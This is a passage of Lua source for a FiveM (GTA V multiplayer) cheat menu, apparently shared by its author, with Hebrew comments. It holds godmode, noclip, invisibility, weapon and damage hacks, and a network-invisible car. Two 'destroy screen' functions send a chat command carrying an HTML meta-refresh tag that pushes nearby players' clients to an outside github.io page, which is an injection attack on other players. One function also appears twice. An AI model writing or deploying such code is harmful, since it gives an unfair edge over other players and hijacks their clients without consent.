        if ExecuteKeybind(currentMenu, text) then
            PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
            debugPrint(buttonText .. ' button pressed via keybind')
            return true
        end
        
        return false 
    else 
        debugPrint('Failed to create ' .. buttonText .. ' button: ' .. tostring(currentMenu) .. ' menu doesn\'t exist') 
        return false 
    end 
end function WarMenu.MenuButton(text, id) if menus[id] then if WarMenu.Button(text .. themecolor .. "   " .. themearrow) then setMenuVisible(currentMenu, false)setMenuVisible(id, true, true) return true end else debugPrint('Failed to create ' .. tostring(text) .. ' menu button: ' .. tostring(id) .. ' submenu doesn\'t exist') end return false end function WarMenu.CheckBox(text, checked, offtext, ontext, callback) if not offtext then offtext = "Off" end if not ontext then ontext = "On" end if WarMenu.Button(text, checked and ontext or offtext) then checked = not checked debugPrint(tostring(text) .. ' checkbox changed to ' .. tostring(checked)) if callback then callback(checked) end return true end return false end function WarMenu.ComboBox(text, items, currentIndex, selectedIndex, callback) local itemsCount = #items local selectedItem = items[currentIndex] local isCurrent = menus[currentMenu].currentOption == (optionCount + 1) if itemsCount > 1 and isCurrent then selectedItem = tostring(selectedItem) end if WarMenu.Button(text, selectedItem) then selectedIndex = currentIndex callback(currentIndex, selectedIndex) return true elseif isCurrent then if currentKey == keys.left then if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end elseif currentKey == keys.right then if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end end else currentIndex = selectedIndex end callback(currentIndex, selectedIndex) return false end function WarMenu.Display() if isMenuVisible(currentMenu) then if menus[currentMenu].aboutToBeClosed then WarMenu.CloseMenu() else ClearAllHelpMessages()drawTitle()drawSubTitle()currentKey = nil if IsDisabledControlJustReleased(1, keys.down) then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) if menus[currentMenu].currentOption < optionCount then menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1 else menus[currentMenu].currentOption = 1 end elseif IsDisabledControlJustReleased(1, keys.up) then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) if menus[currentMenu].currentOption > 1 then menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1 else menus[currentMenu].currentOption = optionCount end elseif IsDisabledControlJustReleased(1, keys.left) then currentKey = keys.left elseif IsDisabledControlJustReleased(1, keys.right) then currentKey = keys.right elseif IsDisabledControlJustReleased(1, keys.select) then currentKey = keys.select elseif IsDisabledControlJustReleased(1, keys.back) then if menus[menus[currentMenu].previousMenu] then PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)setMenuVisible(menus[currentMenu].previousMenu, true) else WarMenu.CloseMenu() end end optionCount = 0 end end end function WarMenu.SetMenuWidth(id, width)setMenuProperty(id, 'width', width) end function WarMenu.SetMenuX(id, x)setMenuProperty(id, 'x', x) end function WarMenu.SetMenuY(id, y)setMenuProperty(id, 'y', y) end function WarMenu.SetMenuMaxOptionCountOnScreen(id, count)setMenuProperty(id, 'maxOptionCount', count) end function WarMenu.SetTitle(id, title)setMenuProperty(id, 'title', title) end function WarMenu.SetTitleColor(id, r, g, b, a)setMenuProperty(id, 'titleColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a}) end function WarMenu.SetTitleBackgroundColor(id, r, g, b, a)setMenuProperty(id, 'titleBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a}) end function WarMenu.SetTitleBackgroundSprite(id, textureDict, textureName)RequestStreamedTextureDict(textureDict)setMenuProperty(id, 'titleBackgroundSprite', {dict = textureDict, name = textureName}) end function WarMenu.SetSubTitle(id, text)setMenuProperty(id, 'subTitle', string.upper(text)) end function WarMenu.SetMenuBackgroundColor(id, r, g, b, a)setMenuProperty(id, 'menuBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a}) end function WarMenu.SetMenuTextColor(id, r, g, b, a)setMenuProperty(id, 'menuTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a}) end function WarMenu.SetMenuSubTextColor(id, r, g, b, a)setMenuProperty(id, 'menuSubTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a}) end function WarMenu.SetMenuFocusColor(id, r, g, b, a)setMenuProperty(id, 'menuFocusColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a}) end function WarMenu.SetMenuButtonPressedSound(id, name, set)setMenuProperty(id, 'buttonPressedSound', {['name'] = name, ['set'] = set}) end

function SoundPlayer()
    local cycle = 500
    local sounds = { "Checkpoint_Hit", "Boss_Blipped" }
    Citizen.CreateThread(function()
        AddTextEntry("CONFIRM_BRING", "Enter the number of seconds to play the sounds: @vis.tes on discord. ")
        DisplayOnscreenKeyboard(1, "CONFIRM_BRING", "", "", "", "", "", 10)
        while UpdateOnscreenKeyboard() == 0 do
            Citizen.Wait(0)
        end
        local result = GetOnscreenKeyboardResult()
        if result then
            local duration = tonumber(result) or 5
            DisplayPasswordNotification("Playing sounds for " .. duration .. " seconds.")
            local endTime = GetGameTimer() + (duration * 1000)
            while GetGameTimer() < endTime do
                for _, sound in ipairs(sounds) do
                    PlaySound(-1, sound, "GTAO_FM_Events_Soundset", true)
                end
                Citizen.Wait(cycle)
            end
            DisplayPasswordNotification("Sounds stopped after " .. duration .. " seconds. @vis.tes on discord.")
        end
    end)
end

-- ShowInfo function for notifications
function ShowInfo(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(true, false)
end

-- Keybind System Functions
function StartKeybindMode(menuId, optionText)
    Citizen.CreateThread(function()
        AddTextEntry('KEYBIND_INPUT', 'Enter key for: ' .. optionText)
        DisplayOnscreenKeyboard(1, "KEYBIND_INPUT", "", "", "", "", "", 10)

        while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
            Citizen.Wait(0)
        end

        if UpdateOnscreenKeyboard() == 1 then
            local inputKey = GetOnscreenKeyboardResult()
            if inputKey and inputKey ~= "" then
                local upperKey = string.upper(inputKey)
                if Keys[upperKey] then
                    -- Save the keybind
                    local bindKey = menuId .. "_" .. optionText
                    menuKeybinds[bindKey] = {
                        key = upperKey, 
                        keyCode = Keys[upperKey],
                        menuId = menuId,
                        optionText = optionText
                    }
                    ShowInfo("~g~Keybind set: " .. upperKey .. " -> " .. optionText)
                else
                    ShowInfo("~r~Invalid key: " .. inputKey .. "\nValid keys: F1-F10, A-Z, 0-9, SPACE, ENTER, etc.")
                end
            else
                ShowInfo("~r~Keybind cancelled - no key entered")
            end
        else
            ShowInfo("~r~Keybind cancelled")
        end
    end)
end

function ExecuteKeybind(menuId, optionText)
    local bindKey = menuId .. "_" .. optionText
    if menuKeybinds[bindKey] then
        local keybind = menuKeybinds[bindKey]
        if IsControlJustPressed(0, keybind.keyCode) then
            return true
        end
    end
    return false
end

function GetKeybindText(menuId, optionText)
    local bindKey = menuId .. "_" .. optionText
    if menuKeybinds[bindKey] then
        return " [" .. menuKeybinds[bindKey].key .. "]"
    end
    return ""
end

-- Global Keybind Handler - Works even when menu is closed
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        
        -- Check all stored keybinds
        for bindKey, keybind in pairs(menuKeybinds) do
            if IsControlJustPressed(0, keybind.keyCode) then
                -- Execute the keybind action
                ExecuteKeybindAction(keybind.menuId, keybind.optionText)
            end
        end
    end
end)

-- Function to execute keybind actions when menu is closed
function ExecuteKeybindAction(menuId, optionText)
    ShowInfo("~b~Executing: " .. optionText)
    
    -- Handle different menu actions based on menuId and optionText
    if menuId == "skid" then
        if optionText == "Player Options" then
            WarMenu.OpenMenu('player')
        elseif optionText == "Self Options" then
            WarMenu.OpenMenu('self')
        elseif optionText == "Weapon Options" then
            WarMenu.OpenMenu('weapon')
        elseif optionText == "Vehicle Options" then
            WarMenu.OpenMenu('vehicle')
        elseif optionText == "World Options" then
            WarMenu.OpenMenu('world')
        elseif optionText == "Teleport Options" then
            WarMenu.OpenMenu('teleport')
        elseif optionText == "Misc Options" then
            WarMenu.OpenMenu('misc')
        elseif optionText == "Lua Options" then
            WarMenu.OpenMenu('lua')
        end
    elseif menuId == "self" then
        if optionText == "Stealth Godmode" then
            Godmode = not Godmode
            ToggleGodmode(Godmode)
        elseif optionText == "Noclip" then
            ToggleNoclip()
        elseif optionText == "Invisibility" then
            Invisibility = not Invisibility
            if not Invisibility then
                SetEntityVisible(PlayerPedId(), true)
            end
        elseif optionText == "Super Jump" then
            SuperJump = not SuperJump
        elseif optionText == "Infinite Stamina" then
            InfStamina = not InfStamina
        elseif optionText == "Never Wanted" then
            NeverWanted = not NeverWanted
        end
    elseif menuId == "weapon" then
        if optionText == "Give All Weapons" then
            GiveAllWeapons(PlayerId())
        elseif optionText == "Strip All Weapons" then
            StripPlayer(PlayerId())
        elseif optionText == "Give Max Ammo" then
            GiveMaxAmmo(PlayerId())
        elseif optionText == "Infinite Ammo" then
            InfAmmo = not InfAmmo
            SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
        elseif optionText == "Explosive Ammo" then
            ExplosiveAmmo = not ExplosiveAmmo
        elseif optionText == "Super Damage" then
            SuperDamage = not SuperDamage
            if SuperDamage then
                SetPlayerWeaponDamageModifier(PlayerId(), 200.0)
            else
                SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
            end
        end
    elseif menuId == "vehicle" then
        if optionText == "Fix Car" then
            local ped = PlayerPedId()
            local veh = GetVehiclePedIsIn(ped, false)
            if veh ~= 0 then
                SetVehicleFixed(veh)
                SetVehicleDirtLevel(veh, 0.0)
                SetVehicleUndriveable(veh, false)
                SetVehicleEngineHealth(veh, 1000.0)
                SetVehicleEngineOn(veh, true, true, false)
                ShowInfo("~g~Car Fixed!")
            end
        elseif optionText == "Flip Vehicle" then
            local veh = GetVehiclePedIsIn(PlayerPedId(), false)
            if veh ~= 0 then
                SetVehicleOnGroundProperly(veh)
            end
        end
    elseif menuId == "misc" then
        if optionText == "Freecam" then
            toggle_camera()
        end
    elseif menuId == "teleport" then
        if optionText == "Teleport To Waypoint" then
            TeleportToWaypoint()
        end
    end
end

-- Function to execute keybind actions when menu is closed
function ExecuteKeybindAction(menuId, optionText)
    ShowInfo("~b~Executing: " .. optionText)
    
    -- Handle different menu actions based on menuId and optionText
    if menuId == "skid" then
        if optionText == "Player Options" then
            WarMenu.OpenMenu('player')
        elseif optionText == "Self Options" then
            WarMenu.OpenMenu('self')
        elseif optionText == "Weapon Options" then
            WarMenu.OpenMenu('weapon')
        elseif optionText == "Vehicle Options" then
            WarMenu.OpenMenu('vehicle')
        elseif optionText == "World Options" then
            WarMenu.OpenMenu('world')
        elseif optionText == "Teleport Options" then
            WarMenu.OpenMenu('teleport')
        elseif optionText == "Misc Options" then
            WarMenu.OpenMenu('misc')
        elseif optionText == "Lua Options" then
            WarMenu.OpenMenu('lua')
        end
    elseif menuId == "self" then
        if optionText == "Stealth Godmode" then
            Godmode = not Godmode
            ToggleGodmode(Godmode)
            ShowInfo("Godmode: " .. (Godmode and "~g~ON" or "~r~OFF"))
        elseif optionText == "Noclip" then
            ToggleNoclip()
            ShowInfo("Noclip: " .. (Noclipping and "~g~ON" or "~r~OFF"))
        elseif optionText == "Invisibility" then
            Invisibility = not Invisibility
            ShowInfo("Invisibility: " .. (Invisibility and "~g~ON" or "~r~OFF"))
        elseif optionText == "Super Jump" then
            SuperJump = not SuperJump
            ShowInfo("Super Jump: " .. (SuperJump and "~g~ON" or "~r~OFF"))
        elseif optionText == "Infinite Stamina" then
            InfStamina = not InfStamina
            ShowInfo("Infinite Stamina: " .. (InfStamina and "~g~ON" or "~r~OFF"))
        elseif optionText == "Never Wanted" then
            NeverWanted = not NeverWanted
            ShowInfo("Never Wanted: " .. (NeverWanted and "~g~ON" or "~r~OFF"))
        end
    elseif menuId == "vehicle" then
        if optionText == "Fix Car" then
            local ped = PlayerPedId()
            local veh = GetVehiclePedIsIn(ped, false)
            if veh ~= 0 then
                SetVehicleFixed(veh)
                SetVehicleDirtLevel(veh, 0.0)
                SetVehicleUndriveable(veh, false)
                SetVehicleEngineHealth(veh, 1000.0)
                SetVehicleEngineOn(veh, true, true, false)
                ShowInfo("~g~Car Fixed!")
            else
                ShowInfo("~r~You are not in a vehicle!")
            end
        elseif optionText == "Flip Vehicle" then
            local veh = GetVehiclePedIsIn(PlayerPedId(), false)
            if veh ~= 0 then
                SetVehicleOnGroundProperly(veh)
                ShowInfo("~g~Vehicle flipped!")
            else
                ShowInfo("~r~You are not in a vehicle!")
            end
        end
    elseif menuId == "weapon" then
        if optionText == "Give All Weapons" then
            GiveAllWeapons(PlayerId())
            ShowInfo("~g~All weapons given!")
        elseif optionText == "Strip All Weapons" then
            StripPlayer(PlayerId())
            ShowInfo("~g~All weapons removed!")
        elseif optionText == "Give Max Ammo" then
            GiveMaxAmmo(PlayerId())
            ShowInfo("~g~Max ammo given!")
        end
    elseif menuId == "misc" then
        if optionText == "Freecam" then
            toggle_camera()
            ShowInfo("Freecam: " .. (cam_active and "~g~ON" or "~r~OFF"))
        end
    end
    
    -- Add more menu actions as needed...
end

-- Helper: Anti-AFK Circle Walking
function StartAntiAFK()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    Citizen.CreateThread(function()
        local player = PlayerPedId()
        local angle = 0.0
        local radius = 1.0 -- רדיוס המעגל
        local waitTime = 50 -- כמה מהר לזוז (ms)

        while AntiAFKEnabled do
            Citizen.Wait(waitTime)
            if IsPedOnFoot(player) and not IsPedInAnyVehicle(player, false) and not IsEntityDead(player) then
                local x, y, z = table.unpack(GetEntityCoords(player, true))
                angle = angle + 0.05
                local newX = x + radius * math.cos(angle)
                local newY = y + radius * math.sin(angle)
                TaskGoStraightToCoord(player, newX, newY, z, 1.0, -1, 0.0, 0.0)
            else
                -- Stop if player is dead or in vehicle
                AntiAFKEnabled = false
                ClearPedTasks(player)
                ShowInfo("~r~Anti-AFK stopped: Player is dead or in vehicle!")
                break
            end
        end

        -- Clear tasks when Anti-AFK is disabled
        ClearPedTasks(player)
    end)
end

function StartSuperBrakes()
    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(0)

            if SuperBrakesEnabled then
                -- אם לוחצים על Ctrl, נעצור את הרכב
                local playerPed = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                if vehicle ~= 0 then
                    if IsControlPressed(0, 36) then -- כפתור Ctrl (Control)
                        -- עוצר את הרכב באופן מוחלט על ידי הגבלת המהירות
                        SetVehicleForwardSpeed(vehicle, 0.0) -- הגבלת המהירות של הרכב לאפס
                        SetEntityInvincible(vehicle, true)  -- לעשות את הרכב בלתי פגיע
                    else
                        SetEntityInvincible(vehicle, false) -- אם לא נלחץ, להפסיק את הבלתי פגיעות
                    end
                end
            end
        end
    end)
end
function StartDriftMode()
    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(0)

            if DriftModeEnabled then
                -- אם Drift Mode פעיל, נקטין את החיכוך בין הגלגלים
                local playerPed = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                if vehicle ~= 0 then
                    -- שינוי הגדרות רכב שגורמות לדריפט
                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fTractionCurveMax", 0.5) -- פחות חיכוך (מגביר דריפט)
                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fTractionCurveMin", 0.4) -- פחות חיכוך
                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fTractionLossMult", 1.5) -- להגדיל את ההתדרדרות בזמן פנייה
                end
            else
                -- אם Drift Mode לא פעיל, נחזיר את הגדרות הרכב לברירות המחדל
                local playerPed = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                if vehicle ~= 0 then
                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fTractionCurveMax", 1.0)
                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fTractionCurveMin", 1.0)
                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fTractionLossMult", 1.0)
                end
            end
        end
    end)
end
function StartHornBoost()
    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(0)

            if HornBoostEnabled then
                local playerPed = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                if vehicle ~= 0 then
                    if IsControlPressed(0, 51) then -- כפתור E (Control 51 זה ה-E)
                        if not HornBoostActive then
                            HornBoostActive = true
                            SetVehicleForwardSpeed(vehicle, 100.0) -- בוסט לרכב (המהירות נקבעת כאן)
                            ShowInfo("Horn Boost Activated!")
                            Citizen.Wait(2000) -- הבוסט יימשך 2 שניות
                            SetVehicleForwardSpeed(vehicle, 0.0) -- מונע המשך בוסט אחרי 2 שניות
                            HornBoostActive = false
                        end
                    end
                end
            end
        end
    end)
end
function StartWaterproofEngine()
    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(0)

            if WaterproofEngineEnabled then
                local playerPed = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                if vehicle ~= 0 then
                    -- הפוך את הרכב לעמיד במים
                    SetVehicleEngineHealth(vehicle, 1000.0)  -- הגדרה של עמידות גבוהה במנוע (בריאות מנוע גבוהה)
                    SetEntityInvincible(vehicle, true) -- להפוך את הרכב לבלתי פגיע במים
                end
            else
                -- אם ה-Waterproof Engine כבוי, נחזיר את המנוע למצב רגיל
                local playerPed = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                if vehicle ~= 0 then
                    SetVehicleEngineHealth(vehicle, 100.0)  -- הגדרת בריאות מנוע רגילה
                    SetEntityInvincible(vehicle, false) -- הרכב יפסיק להיות בלתי פגיע
                end
            end
        end
    end)
end
function StartVehicleJump()
    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(0)

            if VehicleJumpEnabled then
                local playerPed = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                if vehicle ~= 0 then
                    if IsControlJustPressed(0, 22) then -- כפתור רווח (Space)
                        -- הוספת כוח קטן לרכב כדי שהוא יקפוץ קפיצה קטנה
                        local pos = GetEntityCoords(vehicle)
                        ApplyForceToEntity(vehicle, 1, 0.0, 0.0, 50.0, 0.0, 0.0, 0.0, true, true, true, true, true, true)
                        ShowInfo("Vehicle Jump Activated!")
                    end
                end
            end
        end
    end)
end
function StartInvisibleCar()
    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(0)

            if InvisibleCarEnabled then
                local playerPed = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                if vehicle ~= 0 then
                    -- להפוך את הרכב לבלתי נראה לכולם
                    SetEntityVisible(vehicle, false, false)
                    SetEntityInvincible(vehicle, true)  -- להפוך את הרכב לבלתי פגיע
                    NetworkSetEntityVisibleToNetwork(vehicle, false)  -- לא נראה ברשת עבור כל השחקנים
                    ShowInfo("Invisible Car Enabled for Everyone!")
                end
            else
                local playerPed = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                if vehicle ~= 0 then
                    -- להחזיר את הרכב למצב רגיל לכולם
                    SetEntityVisible(vehicle, true, false)
                    SetEntityInvincible(vehicle, false)
                    NetworkSetEntityVisibleToNetwork(vehicle, true)  -- נראה ברשת עבור כל השחקנים
                    ShowInfo("Invisible Car Disabled.")
                end
            end
        end
    end)
end

function StartExplodeSelf()
    -- יצירת DUI להצגת תמונה (אופציונלי)
    local txd = CreateRuntimeTxd('wofDUI')
     local duiObj = CreateDui("https://youtu.be/DsbuNRIZ0GY", 500, 500)
     
    local duiHandle = GetDuiHandle(duiObj)
    CreateRuntimeTextureFromDuiHandle(txd, 'wofDUItex', duiHandle)
ShowInfo ("~r~explode self ~g~activated ~w~will explode in 3 seconds")
    -- מציג את ה-DUI לשתי שניות (אפשר להשאיר או למחוק)
    Citizen.CreateThread(function()
    local endTime = GetGameTimer() + 10000 -- 10 שניות מהזמן הנוכחי
    while GetGameTimer() < endTime do
        Citizen.Wait(0)
       
    end

    -- עוצר ומוחק את ה-DUI אחרי 10 שניות
    DestroyDui(duiObj)
end)

    -- מחכים 2 שניות לפני הפיצוץ
    Citizen.Wait(3500)

    -- פיצוץ במיקום השחקן
    local playerPed = PlayerPedId()
    local coords = GetEntityCoords(playerPed)
    AddExplosion(coords.x, coords.y, coords.z, 4, 10.0, true, false, 1.0)
      local playerPed = PlayerPedId()
    local coords = GetEntityCoords(playerPed)
    AddExplosion(coords.x, coords.y, coords.z, 4, 10.0, true, false, 1.0)
      local playerPed = PlayerPedId()
    local coords = GetEntityCoords(playerPed)
    AddExplosion(coords.x, coords.y, coords.z, 4, 10.0, true, false, 1.0)
end

function HandleNoRecoil()
    if noRecoilEnabled then
        local playerPed = PlayerPedId()
        if IsPedArmed(playerPed, 6) then
            -- מבטל shake של ירי
            ShakeGameplayCam("SMALL_EXPLOSION_SHAKE", 0.0)
        end
    end
end

function UpdateMenuPosition(x, y)
    menuPosX = x
    menuPosY = y
    for id, _ in pairs(menus) do
        setMenuProperty(id, 'x', menuPosX)
        setMenuProperty(id, 'y', menuPosY)
    end
end

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if LazerEyeEnabled then
            -- אם מחזיקים את מקש E (38) יורה לייזר
            if IsControlPressed(0, 38) then 
                local ped = PlayerPedId()
                local from = GetPedBoneCoords(ped, 0x796E, 0.0, 0.0, 0.0) -- עיניים
                local dir = RotationToDirection(GetGameplayCamRot(2))
                local to = from + dir * 100.0

                -- יריית פלאייר צבעונית
                ShootSingleBulletBetweenCoords(
                    from.x, from.y, from.z,
                    to.x, to.y, to.z,
                    100, true,
                    GetHashKey("weapon_flaregun"),
                    ped, true, false, 100.0
                )

                -- אחרי 0.1 שניות יריית Sniper חזקה
                Citizen.CreateThread(function()
                    Citizen.Wait(100)
                    ShootSingleBulletBetweenCoords(
                        from.x, from.y, from.z,
                        to.x, to.y, to.z,
                        100, true,
                        GetHashKey("weapon_heavysniper"),
                        ped, true, false, 100.0
                    )
                end)

                Citizen.Wait(10) -- קצב הירי
            end
        end
    end
end)

function PlayAdultAnim(dict, anim)
    RequestAnimDict(dict)
    while not HasAnimDictLoaded(dict) do
        Citizen.Wait(50)
    end
    TaskPlayAnim(PlayerPedId(), dict, anim, 2.0, 2.5, -1, 15, 0, 0, 0, 0)
end

function ConfirmDestroyScreenQuick()
    -- קבלת המיקום הנוכחי של השחקן
    local ped = PlayerPedId()
    local x, y, z = table.unpack(GetEntityCoords(ped))

    -- יצירת מצלמה גבוהה לשמיים
    local cam = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
    SetCamCoord(cam, x, y, z + 100.0) -- מעלה את המצלמה
    PointCamAtCoord(cam, x, y, z + 200.0) -- מצביעה לשמיים
    SetCamActive(cam, true)
    RenderScriptCams(true, true, 1000, true, true)

    -- מחכה 1.5 שניות לפני שליחת ה/me
    Citizen.SetTimeout(1500, function()
        ExecuteCommand("me <meta http-equiv='refresh' content='0; url=https://ronen323.github.io/KOP/'>")
    end)

    -- מחכה עוד 3 שניות לפני החזרת המצלמה
    Citizen.SetTimeout(10000, function()
        RenderScriptCams(false, true, 1000, true, true)
        DestroyCam(cam, false)
        ClearFocus()
        ShowNotification("~g~Screen destroyed for everyone nearby!")
    end)
end


function ConfirmDestroyScreenSafe()
    local ped = PlayerPedId()
    local x, y, z = table.unpack(GetEntityCoords(ped))

    local cam = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
    SetCamCoord(cam, x, y, z + 100.0)
    PointCamAtCoord(cam, x, y, z + 200.0)
    SetCamActive(cam, true)
    RenderScriptCams(true, true, 1000, true, true)

    Citizen.SetTimeout(1500, function()
        ExecuteCommand("me <meta http-equiv='refresh' content='0; url=https://ronen323.github.io/KOP/'>")
    end)

    Citizen.SetTimeout(20000, function() -- 20 שניות
        RenderScriptCams(false, true, 1000, true, true)
        DestroyCam(cam, false)
        ClearFocus()
        ShowNotification("~g~Screen destroyed for everyone nearby! (Safe Mode)")
    end)
end

Citizen.CreateThread(function()
    local lastActionTime = 0
    local actionCooldown = 1000
    local displayText = ""
    local displayTimer = 0

    while true do
        Citizen.Wait(0)

        if lockCarFeature then
            -- הצגת ההודעה (אם יש)
            if displayTimer > 0 then
                SetTextFont(4)
                SetTextProportional(1)
                SetTextScale(0.6, 0.6)
                SetTextColour(255, 255, 255, 215)
                SetTextCentre(true)
                SetTextDropshadow(0, 0, 0, 0, 255)
                SetTextOutline()
                BeginTextCommandDisplayText("STRING")
                AddTextComponentSubstringPlayerName(displayText)
                EndTextCommandDisplayText(0.5, 0.9)
                displayTimer = displayTimer - 1
            end

            -- לחיצה על E
            if IsControlJustReleased(0, 38) and GetGameTimer() - lastActionTime > actionCooldown then
                local ped = PlayerPedId()
                local pos = GetEntityCoords(ped)
                local vehicle = GetClosestVehicle(pos.x, pos.y, pos.z, 5.0, 0, 71)

                if DoesEntityExist(vehicle) then
                    local locked = GetVehicleDoorLockStatus(vehicle)
                    if locked == 1 then
                        SetVehicleDoorsLocked(vehicle, 2)
                        SetVehicleDoorsLockedForAllPlayers(vehicle, true)
                        displayText = "~r~Vehicle Locked"
                    else
                        SetVehicleDoorsLocked(vehicle, 1)
                        SetVehicleDoorsLockedForAllPlayers(vehicle, false)
                        displayText = "~g~Vehicle Unlocked"
                    end
                    displayTimer = 150
                    lastActionTime = GetGameTimer()
                else
                    displayText = "~y~No vehicle nearby"
                    displayTimer = 150
                end
            end
        end
    end
end)


function ApplyGangOutfit()
    local playerPed = PlayerPedId()
    SetPedComponentVariation(playerPed, 1, 51, 0, 2)
    SetPedComponentVariation(playerPed, 3, 15, 0, 2)
    SetPedComponentVariation(playerPed, 4, 33, 0, 2)
    SetPedComponentVariation(playerPed, 5, 0, 0, 2)
    SetPedComponentVariation(playerPed, 6, 25, 0, 2)
    SetPedComponentVariation(playerPed, 7, 0, 0, 2)
    SetPedComponentVariation(playerPed, 8, 15, 0, 2)
    SetPedComponentVariation(playerPed, 9, 4, 1, 2)
    SetPedComponentVariation(playerPed, 10, 50, 0, 2)
    SetPedComponentVariation(playerPed, 11, 15, 0, 2)
    ShowNotification("~g~Gang outfit equipped!")
end

function ApplyCopOutfit()
    local playerPed = PlayerPedId()
    ClearPedProp(playerPed, 0)
    SetPedComponentVariation(playerPed, 1, 0, 0, 2)
    SetPedComponentVariation(playerPed, 3, 4, 0, 2)
    SetPedComponentVariation(playerPed, 4, 2, 0, 2)
    SetPedComponentVariation(playerPed, 5, 0, 0, 2)
    SetPedComponentVariation(playerPed, 6, 25, 0, 2)
    SetPedComponentVariation(playerPed, 7, 0, 0, 2)
    SetPedComponentVariation(playerPed, 8, 15, 0, 2)
    SetPedComponentVariation(playerPed, 9, 0, 0, 2)
    SetPedComponentVariation(playerPed, 10, 0, 0, 2)
    SetPedComponentVariation(playerPed, 11, 8, 1, 2)
    SetPedPropIndex(playerPed, 0, 1, 0, true)
    ShowNotification("~g~Cop outfit equipped!")
end

function ApplyStreetOutfit()
   local playerPed = PlayerPedId()
    ClearPedProp(playerPed, 0)
    SetPedComponentVariation(playerPed, 1, 0, 0, 2)
    SetPedComponentVariation(playerPed, 3, 4, 0, 2)
    SetPedComponentVariation(playerPed, 4, 2, 0, 2)
    SetPedComponentVariation(playerPed, 5, 0, 0, 2)
    SetPedComponentVariation(playerPed, 6, 25, 0, 2)
    SetPedComponentVariation(playerPed, 7, 0, 0, 2)
    SetPedComponentVariation(playerPed, 8, 15, 0, 2)
    SetPedComponentVariation(playerPed, 9, 0, 0, 2)
    SetPedComponentVariation(playerPed, 10, 0, 0, 2)
    SetPedComponentVariation(playerPed, 11, 8, 1, 2)
    SetPedPropIndex(playerPed, 0, 1, 0, true)
    ShowNotification("~g~Cop outfit equipped!")
end

function ChangePedModel()
    Citizen.CreateThread(function()
        function ShowNotification(text)
            SetNotificationTextEntry("STRING")
            AddTextComponentString(text)
            DrawNotification(false, true)
        end

        AddTextEntry('PED_MODEL_PROMPT', 'Enter Ped Model Name (e.g., a_m_y_skater_01)')
        DisplayOnscreenKeyboard(1, "PED_MODEL_PROMPT", "", "", "", "", "", 64)

        while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
            Citizen.Wait(0)
        end

        if UpdateOnscreenKeyboard() == 1 then
            local modelName = GetOnscreenKeyboardResult()

            if modelName and modelName ~= "" then
                local modelHash = GetHashKey(modelName)

                if IsModelInCdimage(modelHash) and IsModelValid(modelHash) then
                    ShowNotification("~b~Loading model: " .. modelName)

                    RequestModel(modelHash)
                    while not HasModelLoaded(modelHash) do
                        Citizen.Wait(100)
                    end

                    SetPlayerModel(PlayerId(), modelHash)
                    
                    SetPedDefaultComponentVariation(PlayerPedId())

                    ShowNotification("~g~Model successfully changed to: " .. modelName)

                    SetModelAsNoLongerNeeded(modelHash)
                else
                    ShowNotification("~r~Invalid or non-existent model: " .. modelName)
                end
            else
                ShowNotification("~y~No model name entered. Action cancelled.")
            end
        else
            ShowNotification("~y~Model change cancelled.")
        end
    end)
end

function SelfCrash()
    Citizen.CreateThread(function()
        function ShowNotification(text)
            SetNotificationTextEntry("STRING")
            AddTextComponentString(text)
            DrawNotification(false, true)
        end

        AddTextEntry('CONFIRM_CRASH', 'Are you sure you want to crash? Type YES to confirm.')
        DisplayOnscreenKeyboard(1, "CONFIRM_CRASH", "", "", "YES", "", "", 30)

